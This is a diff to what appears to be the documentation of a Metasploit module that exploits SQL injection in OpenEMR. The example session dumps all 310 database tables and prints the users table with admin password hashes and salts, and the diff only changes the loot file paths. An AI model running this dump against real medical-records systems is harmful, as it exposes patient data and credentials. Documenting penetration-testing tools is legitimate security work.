@@ -57,7 +57,6 @@ msf5 auxiliary(sqli/openemr/openemr_sqli_dump) > run
 [*] DB Version: 10.3.15-MariaDB-1
 [*] Enumerating Tables, this may take a moment...
 [*] Identified 310 tables.
-[*] Created dump directory: /root/.msf4/loot/openemr-a323pl20
 [*] Dumping table (1/310): ALL_PLUGINS
 [*] Dumping table (2/310): APPLICABLE_ROLES
 [*] Dumping table (3/310): CHARACTER_SETS
@@ -72,12 +71,12 @@ msf5 auxiliary(sqli/openemr/openemr_sqli_dump) > run
 [*] Dumping table (308/310): gacl_acl_seq
 [*] Dumping table (309/310): background_services
 [*] Dumping table (310/310): geo_country_reference
-[*] Dumped all tables to /root/.msf4/loot/openemr-a323pl20
+[*] Dumped all tables to /root/.msf4/loot
 [*] Auxiliary module execution completed
 msf5 auxiliary(sqli/openemr/openemr_sqli_dump) > exit
 
-root@localhost:/tmp# cd /root/.msf4/loot/openemr-a323pl20
-root@localhost:~/.msf4/loot/openemr-a323pl20# cat users_secure.csv
+root@localhost:/tmp# cd /root/.msf4/loot
+root@localhost:~/.msf4/loot# cat 20190904164551_default_127.0.0.1_openemr.db.users_659759.bin
 id,username,password,salt,last_update,password_history1,salt_history1,password_history2,salt_history2
 1,admin,$2a$05$bxcQWy1ZeIwV2/ScGBQlTOeUVqJo9MdvHuF1mBs4Jo7H0/bFpZoPK,$2a$05$bxcQWy1ZeIwV2/ScGBQlTZ$,2019-08-27 20:07:13,"","","",""
 4,johndoemsf,$2a$05$gUWCtnsoqPBbn5zKiasyaOphgJwkA9BySy7LnK3BswyWt0RrLb0Ma,$2a$05$gUWCtnsoqPBbn5zKiasyaQ$,2019-08-29 02:01:28,"","","",""
